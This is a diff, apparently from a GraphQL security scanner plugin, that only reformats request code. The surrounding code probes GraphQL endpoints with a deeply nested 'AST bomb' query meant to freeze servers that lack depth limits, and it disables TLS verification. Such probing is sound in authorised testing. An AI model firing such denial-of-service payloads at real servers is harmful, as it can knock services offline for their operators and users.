@@ -16,7 +16,10 @@ def run(target, ip, ports, banners):
     endpoints = ["/graphql", "/api/graphql", "/v1/graphql"]
     base_url = f"https://{target}" if target else f"http://{ip}"
 
-    headers = {"Content-Type": "application/json", "User-Agent": "Cascavel-GraphQL-Probe/3.0.1"}
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Cascavel-GraphQL-Probe/3.0.1",
+    }
 
     # Payload desenhado para estourar o AST Depth e o Resolving Engine
     # Se o limitador de depth não estiver ativo, isso trava o server.
@@ -31,7 +34,9 @@ def run(target, ip, ports, banners):
         try:
             # 1. Medir latência Baseline
             t0 = time.time()
-            baseline_resp = requests.post(url, json=baseline_payload, headers=headers, timeout=5, verify=False)
+            baseline_resp = requests.post(
+                url, json=baseline_payload, headers=headers, timeout=5, verify=False
+            )
             baseline_time = time.time() - t0
 
             # Se não retornar 200 pro typename, não é um endpoint graphql válido ou exige auth.
@@ -40,7 +45,9 @@ def run(target, ip, ports, banners):
 
             # 2. Enviar a Bomba AST
             t1 = time.time()
-            bomb_resp = requests.post(url, json=bomb_payload, headers=headers, timeout=10, verify=False)
+            bomb_resp = requests.post(
+                url, json=bomb_payload, headers=headers, timeout=10, verify=False
+            )
             bomb_time = time.time() - t1
 
             # Se a bomba demorar 5x mais que o baseline e retornar Erro HTTP 50x (e não apenas bloqueio WAF 4xx)
